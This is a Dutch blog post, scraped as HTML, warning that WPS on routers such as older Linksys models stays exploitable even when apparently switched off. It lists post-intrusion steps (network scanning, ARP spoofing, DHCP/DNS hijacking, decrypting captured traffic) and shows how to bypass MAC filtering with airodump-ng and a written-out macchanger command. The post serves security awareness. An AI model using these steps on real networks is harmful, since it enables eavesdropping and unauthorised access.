+Het eerste wat je te binnen schiet is natuurlijk gewoon aanmelden op dat netwerk. Maar ja, dan wat? Uit m'n hoofd, dit:<ul><li>Scannen in het netwerk om te kijken of er kwetsbare computers zijn om op in te breken.</li><li>Dingen als <a href="http://en.wikipedia.org/wiki/ARP_spoofing" rel="external nofollow">ARP Spoofing</a> gaan inzetten om al het verkeer om te leiden en af te luisteren.</li><li>DHCP Instellingen aanpassen om al het verkeer via je eigen router te laten lopen.</li><li>DNS Servers aanpassen naar eigen beheerde DNS servers.</li><li>Etc.</li></ul>De mogelijkheden zijn op dit moment al redelijk uitgebreid. Maar je hoeft niet eens inloggen om schade aan te richten. Je hebt nu de WPA(2) sleutel, dus je kunt ook gewoon passief al het verkeer tussen dat accesspoints en de clients opslaan, en later ontsleutelen met de WPA(2) sleutel. Wireshark heeft hier bijvoorbeeld gewoon een optie voor.<br>
+<br>
+Best een serieus lek dus, en al relatief oud. Ik heb er zelfs een jaar geleden al over <a href="http://ikwashetniet.blogspot.nl/2012/01/wps-van-handig-hulpmiddel-naar-gapend.html" rel="external nofollow">geschreven</a>. Maar het blijkt nog steeds onwijs makkelijk te misbruiken.<br>
+<br>
+<b>Boeiend, ik heb het uit staan.</b><br>
+Zeker weten? Bij oudere Linksys modellen (&lt;e4200, en zelfs daar pas vanaf een nieuwere firmware), zijn de enige opties:<br>
+<br>
+<img src="https://tweakers.net/camo/1c3aab44af9a0ab1ac849353e57c3a1221757db4/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fwps%2Fwps.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/wps/wps.png" title="https://dl.dropbox.com/u/7521450/blog/wps/wps.png"><br>
+<br>
+en<br>
+<br>
+<img src="https://tweakers.net/camo/873ad07ed5c5a10b93c1f15495f02a8bd01bc213/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fwps%2Fmanual.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/wps/manual.png" title="https://dl.dropbox.com/u/7521450/blog/wps/manual.png"><br>
+<br>
+Je zou denken dat WPS bij optie twee uit staat, toch? Niet dus. Ik kan m'n aanval nog steeds draaien, en zelfs mijn telefoon weet me te vertellen dat WPS beschikbaar is:<br>
+<br>
+<img src="https://tweakers.net/camo/17f44403d578c764bbb019103377f0ab38d3e860/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fwps%2Fandroid.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/wps/android.png" title="https://dl.dropbox.com/u/7521450/blog/wps/android.png"><br>
+<br>
+<b> Maar ik gebruik MAC Filtering op mijn netwerk, en mijn SSID is verborgen, dus puh</b><br>
+Tja, dan zet ik airodump-ng een minuutje aan en zie ik welke clients er met jouw netwerk verbinden. <br>
+<br>
+Dan weet ik welk MAC adres in ieder geval toegestaan is, en die client stuurt ook nog eens jouw netwerknaam mee zodat ik die ook gelijk weet. Vervolgens is een MAC adres veranderen onder linux een kwestie van 1 commando ( macchanger --mac 00:11:22:33:44:55, mocht je het willen weten <img src="https://tweakers.net/g/s/wink.gif" width="15" height="15" alt=";)">)<br>
+<br>
+<b>Argh, wat moet ik doen dan</b><br>
+Tja, je kán wachten tot de fabrikant een nieuwe firmware uitbrengt waar WPS helemaal uit kan, maar de echte tweaker zet natuurlijk gewoon een custom firmware op de router waar WPS helemaal niet in zit. Verder, hopen en bidden dat je provider het snel voor je oplost. Want op dit moment staat je draadloze netwerk gewoon zo goed als compleet open, ook met MAC filtering en een hidden SSID.</div>
+			</div><div class="pageIndex"><div class="floatright"><a href="https://autopwn.tweakblogs.net/blog/page/2">Oudere posts</a> &raquo;</div></div></div><div class="sidebar">
+        <div id="loginFrame">
+            <h2 class="top">Inloggen</h2>
+            <p>Login met je  <a href="https://tweakblogs.net/login/?location=https%3A%2F%2Fautopwn.tweakblogs.net%2F">Tweakers profiel</a>.</p>
+        </div>
+		<div class="recentPosts">
+			<h4>Recente posts</h4><ul class="ellipsis"><li><a href="https://autopwn.tweakblogs.net/blog/9157/droid-in-the-middle.html" title="Droid in the middle (16)">Droid in the middle (16)</a></li><li><a href="https://autopwn.tweakblogs.net/blog/9112/robots-punt-txt.html" title="robots.txt (12)">robots.txt (12)</a></li><li><a href="https://autopwn.tweakblogs.net/blog/8689/chpwn.html" title="chpwn (13)">chpwn (13)</a></li></ul>
+		</div>
+		<div class="categories">
+			<h4>Categorieën</h4><p>Er zijn nog geen categorieën beschikbaar.</p>
+		</div>
+		<div class="archives">
+			<h4>Archieven</h4><ul id="archiveList"><li class="open"><b>2013</b> (5)<ul class="ulChild"><li><a href="https://autopwn.tweakblogs.net/blog/archief/2013/07/">jul 2013</a> (2)</li><li><a href="https://autopwn.tweakblogs.net/blog/archief/2013/02/">feb 2013</a> (1)</li><li><a href="https://autopwn.tweakblogs.net/blog/archief/2013/01/">jan 2013</a> (2)</li></ul></li><li><b>2012</b> (2)<ul class="ulChild"><li><a href="https://autopwn.tweakblogs.net/blog/archief/2012/12/">dec 2012</a> (2)</li></ul></li></ul><script type="text/javascript">weblogFolderTree('archiveList');</script>
+		</div>
+		<div class="about">
+			<h4>About</h4>
+			<p>Gewoon wat random brainfarts over de wondere wereld van &quot;security&quot;.</p>
+			<ul>
+				<li class="user"><a href="https://tweakers.net/gallery/98264/" rel="nofollow">Profiel op Tweakers</a></li>
+			</ul>
+		</div></div>
+</div>
+            </div>
+
+        </div>    <script>
+                if(window.BehaviourManager)BehaviourManager.exec();
+            </script>
+    <noscript>
+                    <img src="https://tweakers.net/318816705845986/wt?p=328,&amp;cg1=tweakers.net&amp;cg2=Tweakblogs&amp;cp1=LG" width="1" height="1" alt="" style="display:none">
+            </noscript>
+
+<!--
+Request ID: Twk-eun-web3_200.3.5_28706_60114921cb1844.75028885
+Env: frontpage-production
+Server time: 0,0186 s (C: 0,0138 s, Q: 5; 0,0073 s, E: 1; 0,0163 s, M: 2; 0,0028 s, A: 0; 0,0000 s)
+Mem: 5108 KB
+
+Engines: (S) twk-eun-web1 (1)
+-->
+        
+    </body>
+</html>
+```
